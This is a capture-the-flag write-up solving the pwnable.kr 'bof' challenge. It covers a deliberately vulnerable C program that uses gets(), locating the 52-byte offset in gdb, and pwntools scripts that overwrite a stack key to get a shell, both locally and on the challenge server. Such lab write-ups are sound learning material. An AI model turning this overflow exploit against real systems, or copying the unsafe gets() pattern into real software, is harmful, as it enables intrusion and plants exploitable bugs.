# bof

![](<../../.gitbook/assets/image (113) (1).png>)

Contents of bof.c:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Here is the output when I try to buffer overflow the binary:

![](<../../.gitbook/assets/image (1) (2) (1).png>)

There is some protections against overflowing the buffer. I checked what security properties the code had using **checksec**:

![](<../../.gitbook/assets/image (3) (2) (1).png>)

I think the main thing to focus on here is the Stack Canary. Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immediately \[[source](https://ctf101.org/binary-exploitation/stack-canaries/)]. I kept reading the previous source and it seemed that there were a couple ways to bypass the stack protection: leaking the address and brute-forcing the canary. Reading [https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/canaries.md](https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/canaries.md), I found out that I would have to find out what the offset of the stack canary is from the input. I later learned that I was just looking for the distance between input and the key (0xdeadbeef). I ran gdb with the pwndebug add-on and found this after I broke at main:&#x20;

![](<../../.gitbook/assets/image (2) (1) (3).png>)

There are canaries on the stack. In order for me to find the offset, I will try to enter a string and see how far it is until the 0xdeadbeef (our key) value. At this point, I was actually stuck and looked online at some write-ups to see if there was one that would actually teach me what I need to know to not only find the stack canary offset, but to exploit it as well. Either that, or to help with exploiting the buffer overflow vulnerability overall. The solutions that helped me learn how to solve this was: [https://jaimelightfoot.com/blog/pwnable-kr-bof-walkthrough/](https://jaimelightfoot.com/blog/pwnable-kr-bof-walkthrough/) and [https://zacheller.dev/pwnable-bof](https://zacheller.dev/pwnable-bof). I will try to replicate their steps best here.&#x20;

In the code, I first made a break-point at the main function. This was to get an updated list of memory locations (since this would be different than if the code was NOT running). I then made another break-point at line where the comparison was being made  `0x56555654 <func+40> cmp dword ptr [ebp + 8], 0xcafebabe`. Here, I looked at the register table that pwndebug provides:

![](<../../.gitbook/assets/image (112) (1).png>)

My input of `AAAA` was being placed in eax AND esp at the same time. In order to find out how far this was from 0xdeadbeef, I printed a bit around both the esp and eax registers:

![](<../../.gitbook/assets/image (111) (1).png>)

If we look at both of the registers where the data is stored, my input is 13 "chunks" away from 0xdeadbeef. Each "chunk" is 4 characters long, so 13\*4 = 52. This means the distance from our input to 0xdeadbeef is 52 characters long. Now we can start building the exploit. I will be using pwntools to do this to get a better understanding of pwntools and how to code using it.

```
#!/usr/bin/env python3
from pwn import *

p = process("./bof")

#to format in endian (little)
key = p32(0xcafebabe) #https://docs.pwntools.com/en/stable/util/packing.html

exploit = b'A' * 52 + key #52 for the characters to get to 0xdeadbeef | key to replace overfl>

print(exploit) #for the user to see the exploit

p.sendline(exploit)

p.interactive()
```

Output:

![](<../../.gitbook/assets/image (7) (3) (1).png>)

As shown in the image, I did have a local shell, which is what we are hoping to accomplish on the remote server as well. I will modify my script to reflect the remote server.

```
#!/usr/bin/env python3
from pwn import *

URL = 'pwnable.kr'
PORT = 9000

key = p32(0xcafebabe) # https://docs.pwntools.com/en/stable/util/packing.html

exploit = b'A' * 52 + key #52 for the characters to get to 0xdeadbeef | key to replace overflow and replace the value

shell = remote(URL,PORT)
shell.send(exploit)
shell.interactive()
```

Output:

![](<../../.gitbook/assets/image (3) (1) (2).png>)
